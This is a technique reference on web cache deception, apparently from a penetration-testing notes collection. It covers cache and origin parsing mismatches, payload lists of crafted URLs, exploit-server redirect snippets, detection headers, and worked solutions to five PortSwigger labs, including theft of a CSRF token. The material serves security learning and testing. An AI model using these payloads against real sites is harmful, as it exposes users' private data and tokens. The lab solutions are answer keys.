---
title: "Web Cache Deception"
type: technique
tags: [exploitation, information-disclosure, web]
phase: exploitation
severity: high
date_created: 2026-05-13
date_updated: 2026-05-13
sources: [git-portswigger-all-labs]
---

# Web Cache Deception

## Overview

Web Cache Deception (WCD) is a vulnerability that allows attackers to trick a web cache into storing sensitive, user-specific content. The attacker lures a victim into accessing a malicious URL; the victim's request causes their private content to be cached. The attacker then sends the same request and retrieves the cached sensitive data.

**Key difference from Web Cache Poisoning:**
- **Web Cache Deception**: Tricks the cache into storing *private content*, which the attacker later retrieves.
- **Web Cache Poisoning**: Injects *malicious content* into a cache, affecting what other users see.

The vulnerability is rooted in discrepancies between how the **cache server** and **origin server** interpret the same HTTP request — specifically around path parsing, delimiter handling, and URL normalization.

Research basis: *Gotta Cache 'em all: Bending the rules of web cache exploitation* (Black Hat USA 2024).

## How It Works

### Cache Keys and Cache Rules

A web cache stores responses keyed by elements of the HTTP request (URL path, query parameters, sometimes headers). Cache rules decide what to store:

- **Static File Extension Rules**: Cache responses for `.css`, `.js`, `.jpg`, `.png`, etc.
- **Static Directory Rules**: Cache responses whose path begins with `/static/`, `/assets/`, `/resources/`, etc.
- **Filename Rules**: Cache specific files such as `robots.txt`, `favicon.ico`, `index.html`.
- **Custom Rules**: Based on headers, parameters, or application logic.

### The Discrepancy Condition

WCD requires a mismatch: the cache interprets the URL as pointing to a cacheable static resource, while the origin server ignores the "static" portion and returns dynamic, user-specific content.

Common discrepancy types:

1. **Path mapping**: The origin server uses REST routing and ignores extra path segments. `/my-account/wcd.css` is treated as `/my-account` by the origin but cached as a `.css` file by the cache.
2. **Delimiter discrepancies**: The origin uses characters like `;` or `?` as path delimiters and truncates the path at them; the cache treats them literally. `/my-account;wcd.css` → origin serves `/my-account`, cache stores it under a `.css` rule.
3. **Delimiter decoding discrepancies**: Encoded delimiters (`%23` for `#`, `%3F` for `?`) are decoded by one party but not the other. `/profile%23wcd.css` → cache matches `.css` rule; origin decodes `%23` to `#` and serves `/profile`.
4. **Origin server normalization**: Origin resolves encoded dot-segments (`%2f..%2f`) but cache does not. `/static/..%2fmy-account` → cache matches `/static` prefix rule; origin resolves traversal and serves `/my-account`.
5. **Cache server normalization**: Cache resolves encoded dot-segments but origin does not. `/my-account%23%2f%2e%2e%2fresources` → cache resolves to `/resources` (matches static prefix); origin truncates at `%23` and serves `/my-account`.

### Framework-Specific Delimiter Behaviour

Different web frameworks interpret path delimiters uniquely:

| Framework/Server | Delimiter | Behaviour |
|---|---|---|
| Java Spring | `;` | Matrix parameters — truncates path at `;` |
| Ruby on Rails | `.` | Denotes response format |
| OpenLiteSpeed | `%00` | Null byte treated as path terminator |

Caching layers typically treat these characters **literally**, not as delimiters.

## Attack Techniques

### 1. Static Extension Injection (Path Mapping)

Works when the origin server abstracts URL paths (ignores extra segments) and the cache applies extension-based rules.

Steps:
1. Find a dynamic endpoint (e.g., `/my-account`) that returns user-specific data.
2. Confirm the origin ignores extra segments: send `/my-account/test` and check for a 200 with user data.
3. Append a static extension: `/my-account/wcd.js` — check `X-Cache: miss` on first request, `X-Cache: hit` on resend.
4. Deliver the crafted URL to the victim via an exploit server.
5. Retrieve the cached response containing the victim's data.

### 2. Delimiter Abuse

Works when the origin uses a character as a path delimiter but the cache does not.

Steps:
1. Confirm the origin does not abstract paths: `/my-account/test` → 404.
2. Use Burp Intruder with the PortSwigger delimiter list against `/my-account§§abc` (Sniper, URL-encoding disabled).
3. Identify delimiters that return 200 with user data (e.g., `;`, `?`).
4. Test whether the cache also uses `?` as a delimiter: `/my-account?abc.js` — if not cached, `?` is shared; try `;` instead.
5. Craft payload using the delimiter the cache does *not* treat as a delimiter: `/my-account;wcd.js`.
6. Deliver to victim, then retrieve cached response.

### 3. Origin Server Normalization (Path Traversal via Encoded Dot-Segments)

Works when the origin resolves encoded dot-segments (`%2f..%2f`) but the cache does not, and the cache has a static directory rule.

Steps:
1. Identify a static directory prefix the cache caches (e.g., `/resources`).
2. Confirm the cache does *not* resolve dot-segments: `/resources/..%2fRESOURCES` gets `X-Cache: hit` (cache matched `/resources` prefix literally).
3. Confirm the origin *does* resolve: `/aaa/..%2fmy-account` → 404 (origin resolved and found no such page); `/resources/..%2fmy-account` → 200 with user data.
4. Send `/resources/..%2fmy-account` — verify `X-Cache: miss` then `X-Cache: hit` on resend.
5. Deliver to victim, retrieve cached response.

### 4. Cache Server Normalization (Combined Delimiter + Traversal)

Works when the cache resolves encoded dot-segments but the origin does not, combined with a delimiter the origin recognises.

Steps:
1. Confirm cache resolves dot-segments: `/aaa/..%2fresources/file` → `X-Cache: hit` (cache mapped to `/resources`).
2. Confirm origin does *not* resolve: `/resources/.%2ffile` → not cached (no match after resolution).
3. Test origin delimiters via Intruder; confirm `;` and `?` yield 200.
4. Test delimiter + traversal combinations with encoded `%23` (`#`), `%3F` (`?`): `/my-account%23%2f%2e%2e%2fresources` → 200 with user data and `X-Cache: miss` then `X-Cache: hit`.
5. Deliver to victim, retrieve cached CSRF token or sensitive data.

### 5. Exact-Match Filename Rules (Expert)

Works when the cache has rules for specific filenames (`robots.txt`, `index.html`, `favicon.ico`) and the cache resolves dot-segments.

Steps:
1. Confirm `/robots.txt` is cached: `X-Cache: miss` → `X-Cache: hit`.
2. Confirm cache normalizes dot-segments: `/aaa/..%2frobots.txt` → `X-Cache: hit`.
3. Confirm origin does not resolve: `/aa/..%2fmy-account` → 404.
4. Combine delimiter + traversal: `/my-account;%2f%2e%2e%2frobots.txt` → 200 with user data + CSRF token, `X-Cache: miss` → `X-Cache: hit`.
5. Deliver to victim using `<img src="/my-account;%2f%2e%2e%2frobots.txt?cb">` to force a credentialed request.
6. Retrieve cached CSRF token, then chain into a CSRF exploit.

## Payloads

### Path Mapping (Static Extension Injection)

```
/my-account/wcd.js
/my-account/wcd.css
/my-account/wcd.jpg
/profile/wcd.png
```

### Delimiter Abuse

```
# Semicolon delimiter (Java Spring, others)
/my-account;wcd.js
/my-account;foo.css

# Question mark delimiter
/my-account?wcd.js

# Encoded delimiters (decoded by origin, not cache)
/my-account%3fwcd.css       # %3F = ?
/profile%23wcd.css          # %23 = #
```

### Encoded Path Traversal (Origin Normalizes, Cache Does Not)

```
/resources/..%2fmy-account
/static/..%2fprofile
/assets/..%2fadmin
```

### Cache Normalizes + Delimiter (Cache Normalizes, Origin Does Not)

```
/my-account%23%2f%2e%2e%2fresources
/my-account;%2f%2e%2e%2frobots.txt
/my-account?%2f%2e%2e%2fresources
```

### Cache Buster (Prevent Interference)

```
# Append unique query parameter to each test request
/my-account/wcd.js?cb=RANDOM
```

Via Burp: Param Miner → Settings → Add dynamic cachebuster.

### Exploit Delivery via Exploit Server

```html
<script>document.location="https://TARGET.web-security-academy.net/my-account/wcd.js"</script>
<script>document.location="https://TARGET.web-security-academy.net/my-account;wcd.js"</script>
<script>document.location="https://TARGET.web-security-academy.net/resources/..%2fmy-account"</script>
<script>document.location="https://TARGET.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?cb=1"</script>
<img src="/my-account;%2f%2e%2e%2frobots.txt?cb=1" />
```

### Default Cacheable File Extensions

```
.css .js .jpg .jpeg .png .gif .svg .ico .woff .woff2 .ttf .otf
.pdf .zip .gz .tar .bz2 .rar .7z .mp3 .mp4 .avi .mkv .webm
.txt .xml .json .csv .doc .docx .xls .xlsx .ppt .pptx
```

### Delimiter Characters for Testing

```
; ? # . ! % & @ \ | ^
%3B %3F %23 %2E %21 %25 %26 %40 %5C %7C %5E
%00 (null byte — OpenLiteSpeed)
```

## Detection

### Response Header Indicators

| Header | Value | Meaning |
|---|---|---|
| `X-Cache` | `miss` | Response fetched from origin (first request) |
| `X-Cache` | `hit` | Response served from cache |
| `X-Cache` | `dynamic` | Origin-generated, not cached |
| `X-Cache` | `refresh` | Cached copy was refreshed |
| `Cache-Control` | `public, max-age=N` | Response marked as cacheable |

A shift from `X-Cache: miss` to `X-Cache: hit` on the second identical request confirms caching.

### Response Time

A significant decrease in response time on repeat requests indicates a cache hit.

### Testing Flow

1. Send a GET request to a dynamic endpoint with user-specific data.
2. Append an arbitrary path segment or extension and resend.
3. Observe `X-Cache` headers and response content.
4. Use Burp Intruder with delimiter list to identify effective delimiters.
5. Combine with encoded traversal sequences to test normalization discrepancies.
6. Always use a cache buster (random query parameter) to isolate test results from prior cached responses.

### Tools

- **Burp Suite Repeater**: Manual path manipulation and header inspection.
- **Burp Suite Intruder**: Automated delimiter fuzzing (`/my-account§§abc` with sniper mode; disable URL encoding for payload).
- **Param Miner**: Dynamic cache buster to prevent false positives.
- **FoxyProxy**: Route browser traffic through Burp for full HTTP history.

## PortSwigger Labs

### Apprentice

#### Lab 1 — Exploiting path mapping for web cache deception

The origin server uses REST routing and abstracts URL paths, ignoring extra segments. The cache applies static extension rules.

Key observations:
- `GET /my-account/test` → 200 with API key (origin ignores extra segment)
- `GET /my-account/wcd.js` → first request: `X-Cache: miss`, `Cache-Control: max-age=30`; second request: `X-Cache: hit`

Exploit:
```html
<script>document.location="https://LAB-ID.web-security-academy.net/my-account/hanzalaa.js"</script>
```

After victim visits the URL, retrieve from cache:
```
GET /my-account/hanzalaa.js
```
Response contains victim's API key.

---

### Practitioner

#### Lab 2 — Exploiting path delimiters for web cache deception

The origin uses `;` and `?` as path delimiters (confirmed via Intruder fuzzing). The cache does not treat `?` as a delimiter, but `;` works.

Key observations:
- `/my-account/test` → 404 (origin does not abstract paths)
- Intruder with delimiter list: `;` and `?` return 200 with API key
- `/my-account?abc.js` → not cached (cache also uses `?` as delimiter)
- `/my-account;wcd.js` → `X-Cache: miss` then `X-Cache: hit` (cache stores it)

Exploit:
```html
<script>document.location="https://LAB-ID.web-security-academy.net/my-account;hanzala.js"</script>
```

---

#### Lab 3 — Exploiting origin server normalization for web cache deception

The origin resolves encoded dot-segments; the cache does not. Cache has a static directory rule for `/resources`.

Key observations:
- `/resources/..%2fRESOURCES` → 404, `X-Cache: miss` → `X-Cache: hit` (cache matched `/resources` prefix, did not resolve traversal)
- `/resources/..%2fmy-account` → 200 with API key, `X-Cache: miss` → `X-Cache: hit`

Exploit:
```html
<script>document.location="https://LAB-ID.web-security-academy.net/resources/..%2fmy-account"</script>
```

Retrieve:
```
GET /resources/..%2fmy-account
```

---

#### Lab 4 — Exploiting cache server normalization for web cache deception

The cache resolves encoded dot-segments; the origin does not. Combined with a delimiter (`%23`/`#`) the origin recognises.

Key observations:
- `/aaa/..%2fresources/file` → `X-Cache: hit` (cache resolves, matches `/resources`)
- `/resources/.%2ffile` → not cached (confirms cache resolves dot-segments)
- `/my-account%23%2f%2e%2e%2fresources` → 200 with API key, `X-Cache: miss` → `X-Cache: hit` (cache resolves to `/resources`; origin decodes `%23` to `#`, truncates path)

Exploit:
```html
<script>document.location="https://LAB-ID.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?cb=1"</script>
```

Retrieve:
```
GET /my-account%23%2f%2e%2e%2fresources?hanp
```

---

### Expert

#### Lab 5 — Exploiting exact-match cache rules for web cache deception

Goal: steal administrator's CSRF token and change their email via a chained CSRF exploit.

Key observations:
- Cache has an exact-match rule for `robots.txt`: `X-Cache: miss` → `X-Cache: hit`
- Cache resolves dot-segments: `/aaa/..%2frobots.txt` → `X-Cache: hit`
- Origin does not resolve: `/aa/..%2fmy-account` → 404
- Origin uses `;` as a delimiter: confirmed via Intruder
- Combined payload: `/my-account;%2f%2e%2e%2frobots.txt` → 200 with user data + CSRF token, `X-Cache: miss` → `X-Cache: hit`

Step 1 — cache victim's CSRF token:
```html
<img src="/my-account;%2f%2e%2e%2frobots.txt?wc" />
```

Step 2 — retrieve CSRF token:
```
GET /my-account;%2f%2e%2e%2frobots.txt?wc
```

Step 3 — craft CSRF exploit using Burp's "Generate CSRF PoC" on `POST /my-account/change-email`, replace CSRF token with administrator's, deliver to victim.
